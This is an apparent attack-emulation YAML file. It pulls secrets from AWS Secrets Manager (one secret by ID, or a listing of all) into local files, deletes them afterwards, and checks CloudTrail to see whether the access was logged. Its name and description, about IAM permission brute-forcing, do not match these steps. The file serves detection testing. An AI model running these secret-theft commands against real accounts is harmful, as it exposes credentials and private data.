---
name: brute-force-iam-permissions
description: |
  Determine what permissions an IAM role has through
  brute force using the
  [enumerate-iam](https://github.com/andresriancho/enumerate-iam) tool.
args:
  - name: detect
  - name: target_secret_id

steps:
  - name: ensure-aws-creds-present
    inline: |
      set -e
      if [[ -z "${AWS_DEFAULT_REGION}" ]]; then
          echo "Error: AWS_DEFAULT_REGION must be set."
          exit 1
      fi
      if [[ -n "${AWS_ACCESS_KEY_ID}" && -n "${AWS_SECRET_ACCESS_KEY}" ]]; then
          if [[ -z "${AWS_SESSION_TOKEN}" ]]; then
            echo "Warning: AWS_SESSION_TOKEN is not set with AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY."
          fi
      elif [[ -z "${AWS_PROFILE}" ]]; then
          echo "Error: AWS credentials are not set, exiting."
          exit 1
      fi

  - name: ensure-aws-cli-present
    inline: |
      set -e

      if ! [ -x "$(command -v aws)" ]; then
        echo 'Error: AWS CLI is not installed.' >&2
      else
        echo -e "AWS CLI is installed: $(aws --version)"
      fi

  - name: steal-secret
    inline: |
      set -e

      mkdir -p artifacts

      stolen_content=""

      if [[ "{{ .Args.target_secret_id }}" == all ]]; then
          aws secretsmanager list-secrets | jq . > artifacts/all_secrets.json
      else
          stolen_content="$(aws secretsmanager get-secret-value --secret-id "{{ .Args.target_secret_id }}" \
            --region "${AWS_DEFAULT_REGION}" | jq -r .SecretString)"

          # Check if stolen_content is empty
          if [[ -z "$stolen_content" ]]; then
              echo "No content fetched from the secret: {{ .Args.target_secret_id }}"
          else
              echo "$stolen_content" > artifacts/{{ .Args.target_secret_id }}.json
          fi
      fi

    cleanup:
      inline: |
        set -e

        echo "Deleting pillaged secrets"
        rm -rf artifacts

  - name: check-detection
    inline: |
      set -e

      if [[ "{{ .Args.detect }}" == true ]]; then
          current_time() {
            date -u +'%Y-%m-%dT%H:%M:%SZ'
          }

          ten_minutes_ago() {
          if [[ "$OSTYPE" == "darwin"* ]]; then
              date -v-10M -u +'%Y-%m-%dT%H:%M:%SZ'
          else
              date -u -d '10 minutes ago' +'%Y-%m-%dT%H:%M:%SZ'
          fi
          }

          START_TIME=$(ten_minutes_ago)
          END_TIME=$(current_time)

          API_CALLS=("GetSecretValue" "ListSecrets")

          for api_call in "${API_CALLS[@]}"; do
          EVENTS=$(aws cloudtrail lookup-events \
              --lookup-attributes AttributeKey=EventName,AttributeValue=$api_call \
              --start-time $START_TIME \
              --end-time $END_TIME)

          if echo "$EVENTS" | jq -e '.Events[] | select(.EventName=="'$api_call'")' > /dev/null; then
              echo "EventTime EventName SecretId EventSource Region AccessKeyId SourceIPAddress"
              DETAILS=$(echo "$EVENTS" | jq -r '.Events[] | "\(.EventTime) \(.EventName) \((.CloudTrailEvent | fromjson).requestParameters.secretId) \(.EventSource) \((.CloudTrailEvent | fromjson).awsRegion) \((.CloudTrailEvent | fromjson).userIdentity.accessKeyId) \((.CloudTrailEvent | fromjson).sourceIPAddress)"')

              echo "$DETAILS"

          else
              echo "No $api_call event detected in the last 10 minutes"
          fi
          done
      fi
